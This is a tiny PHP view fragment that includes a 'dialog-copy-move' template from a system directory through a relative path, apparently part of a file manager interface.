require self::getPathTemplate("../system/dialog-copy-move");
?>
